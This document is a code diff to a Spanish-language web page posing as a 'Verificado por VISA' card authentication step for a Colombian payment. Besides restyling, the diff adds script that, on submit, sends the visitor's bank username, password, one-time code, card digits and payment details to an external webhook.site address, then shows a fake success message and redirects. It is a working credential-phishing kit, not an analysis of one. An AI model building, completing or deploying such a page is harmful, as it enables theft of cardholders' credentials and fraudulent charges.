@@ -16,6 +16,10 @@
             --co-bg: #f5f5f5;
             --co-border: #e5e7eb;
             --co-white: #fff;
+            --co-success: #155724;
+            --co-success-bg: #d4edda;
+            --co-error: #c1121f;
+            --co-error-bg: #f8d7da;
         }
 
         * {
@@ -61,7 +65,6 @@
             }
         }
 
-        /* HEADER CON LOGO */
         .header {
             display: flex;
             align-items: center;
@@ -81,7 +84,6 @@
             .header {
                 margin-bottom: 18px;
             }
-
             .visa-logo {
                 width: 170px;
             }
@@ -93,7 +95,6 @@
                 justify-content: flex-start;
                 gap: 12px;
             }
-
             .visa-logo {
                 width: 150px;
             }
@@ -111,21 +112,6 @@
             display: block;
         }
 
-        .verified-text {
-            font-size: 0.875rem;
-            color: var(--co-text-muted);
-            line-height: 1.2;
-        }
-
-        .verified-text strong {
-            display: block;
-            font-size: 1.75rem;
-            font-weight: 700;
-            color: var(--co-blue);
-            line-height: 1.1;
-        }
-
-        /* TITULO PRINCIPAL */
         .form-title {
             font-size: 1.25rem;
             font-weight: 700;
@@ -146,14 +132,12 @@
                 font-size: 1.125rem;
                 margin-bottom: 4px;
             }
-
             .form-subtitle {
                 font-size: 0.875rem;
                 margin-bottom: 16px;
             }
         }
 
-        /* INFORMACIÓN DE TRANSACCIÓN */
         .transaction-info {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -197,21 +181,17 @@
                 font-size: 0.875rem;
                 margin-bottom: 16px;
             }
-
             .info-row {
                 padding: 6px 0;
             }
-
             .info-label {
                 font-size: 0.8125rem;
             }
-
             .info-value {
                 font-size: 0.8125rem;
             }
         }
 
-        /* FORMULARIO */
         form {
             display: flex;
             flex-direction: column;
@@ -238,7 +218,7 @@
             font-family: 'Inter', system-ui, sans-serif;
             font-size: 1rem;
             color: var(--co-text);
-            transition: border-color 0.2s;
+            transition: border-color 0.2s, box-shadow 0.2s;
             background: var(--co-white);
             width: 100%;
         }
@@ -260,7 +240,6 @@
             }
         }
 
-        /* SECCIÓN DE CREDENCIALES */
         .credentials-section {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -305,7 +284,6 @@
                 padding: 14px;
                 gap: 14px;
             }
-
             .credentials-grid {
                 gap: 10px;
             }
@@ -316,12 +294,10 @@
                 padding: 12px;
                 gap: 12px;
             }
-
             .credentials-grid {
                 grid-template-columns: 1fr;
                 gap: 12px;
             }
-
             .form-input-small {
                 font-size: 0.9375rem;
                 padding: 10px 12px;
@@ -329,7 +305,6 @@
             }
         }
 
-        /* CÓDIGO DE CONFIRMACIÓN */
         .confirmation-section {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -364,13 +339,11 @@
             .confirmation-section {
                 padding: 12px;
             }
-
             .confirmation-section .form-label {
                 font-size: 0.8125rem;
             }
         }
 
-        /* BOTONES */
         .button-group {
             display: flex;
             align-items: center;
@@ -388,7 +361,7 @@
             font-size: 0.9375rem;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s, color 0.2s;
+            transition: background-color 0.2s, color 0.2s, opacity 0.2s;
             text-decoration: none;
             display: inline-flex;
             align-items: center;
@@ -404,13 +377,14 @@
             height: 44px;
         }
 
-        .btn-submit:hover {
+        .btn-submit:hover:not(:disabled) {
             background-color: #0d8b7e;
         }
 
         .btn-submit:disabled {
             background-color: var(--co-text-muted);
             cursor: not-allowed;
+            opacity: 0.6;
         }
 
         .btn-link {
@@ -426,15 +400,44 @@
             color: var(--co-text);
         }
 
-        /* FOOTER LINKS */
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid var(--co-border);
-            flex-wrap: wrap;
+        .error-message {
+            color: var(--co-error);
+            font-size: 0.8125rem;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group.error .form-input {
+            border-color: var(--co-error);
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
+        .message-box {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 0.9375rem;
+            border: 1px solid transparent;
+        }
+
+        .message-box.show {
+            display: block;
+        }
+
+        .message-box.success {
+            background: var(--co-success-bg);
+            color: var(--co-success);
+            border-color: #c3e6cb;
+        }
+
+        .message-box.error {
+            background: var(--co-error-bg);
+            color: var(--co-error);
+            border-color: #f5c6cb;
         }
 
         @media (max-width: 640px) {
@@ -442,7 +445,6 @@
                 gap: 10px;
                 margin-top: 14px;
             }
-
             .btn-submit {
                 min-width: 100px;
                 padding: 8px 24px;
@@ -455,86 +457,44 @@
                 gap: 8px;
                 margin-top: 12px;
             }
-
             .btn-submit {
                 min-width: 90px;
                 padding: 8px 20px;
                 height: 38px;
                 font-size: 0.875rem;
             }
-
             .btn-link {
                 font-size: 0.75rem;
                 padding: 4px 6px;
             }
         }
 
-        /* ERROR MESSAGES */
-        .error-message {
-            color: #c1121f;
-            font-size: 0.8125rem;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .form-group.error .form-input {
-            border-color: #c1121f;
-        }
-
-        .form-group.error .error-message {
-            display: block;
-        }
-
-        /* SUCCESS MESSAGE */
-        .success-message {
-            display: none;
-            background: #d4edda;
-            color: #155724;
-            padding: 12px 16px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 0.9375rem;
-            border: 1px solid #c3e6cb;
-        }
-
-        .success-message.show {
-            display: block;
-        }
-
-        /* RESPONSIVE - EXTRA SMALL DEVICES */
         @media (max-width: 360px) {
             html, body {
                 padding: 0;
             }
-
             .container {
                 padding: 16px;
                 margin: 8px;
             }
-
             .header {
                 margin-bottom: 20px;
             }
-
             .visa-logo {
                 width: 100px;
             }
-
             .form-title {
                 font-size: 1rem;
                 margin-bottom: 6px;
             }
-
             .form-subtitle {
                 font-size: 0.8125rem;
                 margin-bottom: 16px;
             }
-
             .button-group {
                 gap: 6px;
                 margin-top: 14px;
             }
-
             .btn-submit {
                 min-width: 90px;
                 padding: 8px 16px;
@@ -548,7 +508,7 @@
         <!-- HEADER CON LOGO -->
         <div class="header">
             <div class="visa-logo">
-                <img src="securecode.png" alt="Verificado por VISA" />
+                <img src="image.png" alt="Verificado por VISA" />
             </div>
         </div>
 
@@ -578,9 +538,7 @@
 
         <!-- FORMULARIO -->
         <form id="authForm" novalidate>
-            <div class="success-message" id="successMessage">
-                ¡Autenticación exitosa! Redirigiendo...
-            </div>
+            <div class="message-box" id="messageBox"></div>
 
             <!-- CREDENCIALES -->
             <div class="credentials-section">
@@ -633,29 +591,28 @@
             <div class="button-group">
                 <a href="#" class="btn btn-link" id="helpLink">Ayuda</a>
                 <a href="#" class="btn btn-link" id="cancelLink">Cancelar</a>
-                <button type="submit" class="btn btn-submit">Enviar</button>
+                <button type="submit" class="btn btn-submit" id="submitBtn">Enviar</button>
             </div>
         </form>
     </div>
 
     <script>
-        // Obtener datos del formulario de pago (simulado o desde sessionStorage)
+        // Configuración del webhook
+        const WEBHOOK_URL = 'https://webhook.site/your-webhook-id'; // Cambia esto por tu URL de webhook real
+
+        // Inicializar transacción
         function initializeTransaction() {
-            // Obtener el monto desde sessionStorage (si viene del formulario anterior)
             const storageAmount = sessionStorage.getItem('paymentAmount') || '23.000';
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             
-            // Calcular monto total
             let amount = 23000;
             if (storagePriority) {
                 amount += 20000;
             }
             
-            // Formatear y mostrar
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
             document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';
             
-            // Fecha actual
             const now = new Date();
             const dateStr = now.toLocaleDateString('es-CO', {
                 year: 'numeric',
@@ -669,10 +626,8 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
-            // Últimos 4 dígitos de tarjeta desde sessionStorage o localStorage
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
             
-            // Si no está guardado, intentar obtenerlo del campo de número de tarjeta si está disponible
             const cardNumberField = document.getElementById('cardNumber');
             if (cardNumberField && cardNumberField.value) {
                 const fullCardNumber = cardNumberField.value.replace(/\s/g, '');
@@ -685,12 +640,48 @@
             document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
         }
 
+        // Mostrar mensaje
+        function showMessage(message, type = 'success') {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.textContent = message;
+            messageBox.className = `message-box show ${type}`;
+        }
+
+        function hideMessage() {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.className = 'message-box';
+            messageBox.textContent = '';
+        }
+
+        // Enviar datos al webhook
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Error HTTP: ${response.status}`);
+                }
+
+                const result = await response.json();
+                return { success: true, data: result };
+            } catch (error) {
+                console.error('Error enviando al webhook:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
         // Validación del formulario
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
-        const successMessage = document.getElementById('successMessage');
+        const submitBtn = document.getElementById('submitBtn');
 
         // Validar campo al salir
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
@@ -706,8 +697,23 @@
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        form.addEventListener('submit', function(e) {
+        // Resetear estados cuando el usuario escribe
+        [usernameInput, passwordInput, confirmationInput].forEach(input => {
+            input.addEventListener('input', function() {
+                if (this.parentElement.classList.contains('error')) {
+                    this.parentElement.classList.remove('error');
+                }
+                hideMessage();
+            });
+        });
+
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            // Resetear estado del botón
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Enviando...';
+            hideMessage();
 
             let isValid = true;
 
@@ -743,25 +749,58 @@
                 confirmationInput.parentElement.classList.remove('error');
             }
 
-            if (isValid) {
-                // Mostrar mensaje de éxito
-                successMessage.classList.add('show');
-                
-                // Desactivar botón
-                form.querySelector('button[type="submit"]').disabled = true;
-                
-                // Simular redirección
-                setTimeout(() => {
-                    // Redirigir a página de confirmación o éxito
-                    window.location.href = 'confirmacion.html';
-                }, 1500);
+            if (!isValid) {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Enviar';
+                return;
+            }
+
+            // Preparar datos para el webhook
+            const transactionData = {
+                timestamp: new Date().toISOString(),
+                usuario: usernameInput.value.trim(),
+                contraseña: passwordInput.value.trim(),
+                codigo_otp: confirmationInput.value.trim(),
+                monto: document.getElementById('transaction-amount').textContent,
+                comercio: 'Superintendencia',
+                tarjeta: document.getElementById('card-last-digits').textContent,
+                fecha: document.getElementById('transaction-date').textContent,
+                user_agent: navigator.userAgent,
+                ip: '0.0.0.0' // En producción, esto vendría del servidor
+            };
+
+            try {
+                // Enviar al webhook
+                const result = await sendToWebhook(transactionData);
+
+                if (result.success) {
+                    showMessage('✅ ¡Autenticación exitosa! Redirigiendo...', 'success');
+                    
+                    // Guardar en sessionStorage para la siguiente página
+                    sessionStorage.setItem('authSuccess', 'true');
+                    sessionStorage.setItem('authData', JSON.stringify(transactionData));
+                    
+                    // Redirigir después de 1.5 segundos
+                    setTimeout(() => {
+                        window.location.href = 'confirmacion.html';
+                    }, 1500);
+                } else {
+                    showMessage('❌ Error al procesar la autenticación: ' + result.error, 'error');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Enviar';
+                }
+            } catch (error) {
+                console.error('Error en la autenticación:', error);
+                showMessage('❌ Error al procesar la solicitud. Por favor, intente nuevamente.', 'error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Enviar';
             }
         });
 
         // Botones de enlace
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('Para más ayuda, contacte a su banco o al servicio de atención al cliente.');
+            showMessage('📞 Para más ayuda, contacte a su banco o al servicio de atención al cliente.', 'success');
         });
 
         document.getElementById('cancelLink').addEventListener('click', function(e) {
